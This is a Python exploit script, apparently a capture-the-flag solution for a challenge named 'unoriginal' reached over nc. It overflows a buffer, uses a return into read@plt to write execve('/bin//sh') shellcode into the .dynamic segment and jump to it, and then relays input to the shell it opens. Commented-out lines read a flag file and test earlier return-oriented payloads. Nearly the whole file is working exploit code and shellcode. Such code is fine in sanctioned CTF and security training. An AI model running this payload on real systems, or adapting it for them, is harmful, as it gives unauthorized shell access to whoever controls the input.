### Usage: python unoriginal.py | ./unoriginal
###    or: python unoriginal.py | nc unoriginal.uiuc.sexy 1235

import sys, struct

wr = sys.stdout.write
pi = lambda x: struct.pack('<I', x)

def prepare(*args):
    e = ' ' * 17 + ''.join(args)
    return e.ljust(256, ' ')

shellcode = (
   "\x31\xc9"                  # xor    %ecx,%ecx
   "\xf7\xe1"                  # mul    %ecx
   "\x51"                      # push   %ecx
   "\x68\x2f\x2f\x73\x68"      # push   $0x68732f2f
   "\x68\x2f\x62\x69\x6e"      # push   $0x6e69622f
   "\x89\xe3"                  # mov    %esp,%ebx
   "\xb0\x0b"                  # mov    $0xb,%al
   "\xcd\x80"                  # int    $0x80
)

read_plt = 0x80482f0
# jumps to read_plt, feeds stdin into .dynamic segment, then jumps to it
exploit = prepare(
    pi(read_plt), 
    pi(0x8049640),      # ret_val = .dynamic
    pi(0),              # stdin
    pi(0x8049640),      # .dynamic
    pi(len(shellcode)), # nbytes
    )
wr(exploit); 
wr(shellcode);
while True:
    sys.stderr.write(">>");
    _in = sys.stdin.readline()
    wr(_in)
    sys.stdout.flush();

# wr("find /home \n");
# wr("cat /home/asdf/flag.txt \n");

# # double-print hack the planet
# printbanner = 0x804845d
# puts = 0x8048300
# # puts = 0x8048462
# halt = 0x8048360

# # prints hack the planet
# banner = prepare(pi(0x804845d))

# # prints hack the planet by push &str, then returning to [call puts]
# callputs = 0x8048462; str = 0x8048501; str = 0x8049640
# banner2 = prepare(pi(callputs), pi(str))

# # prints planet by push &str, push $ret, then returning to [puts@plt]
# putsplt = 0x8048300; ret = 0x804846f; str = 0x8048508
# banner3 = prepare(pi(putsplt), pi(ret), pi(str))
